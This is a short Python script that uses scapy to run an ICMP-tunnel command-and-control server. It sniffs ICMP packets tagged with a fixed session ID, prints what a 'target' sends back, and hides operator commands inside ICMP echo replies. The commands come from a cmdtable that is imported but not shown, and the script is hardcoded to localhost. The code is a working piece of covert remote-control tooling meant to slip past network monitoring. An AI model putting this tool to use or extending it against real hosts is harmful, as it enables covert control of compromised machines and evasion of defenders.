from scapy.all import *
from multiprocessing import Process
from commands import *

SESSION_ID = int(1028)
BENIGN_SEQ = int(99)

def icmp_send(addr, payload, sequence):
    send(IP(dst=addr)/ICMP(type=0, id=SESSION_ID, seq=sequence)/payload)


def catch(packet):
    if packet[ICMP].id == SESSION_ID and packet[ICMP].type == 8:
        print(packet[IP].src, ":", packet[Raw].load)

def snifff():
    print("Starting Server")
    sniff(prn=catch, filter="icmp", store="0")

if __name__ == "__main__":
    sniffer = Process(target=snifff)
    sniffer.start()

    while 1:
        response = input("\n> ")

        if response in cmdtable:
            command = cmdtable[response]
            print("Sending command", response, "to target")
            icmp_send('127.0.0.1', command[1], command[0])
        else:
            icmp_send('127.0.0.1', response, BENIGN_SEQ)
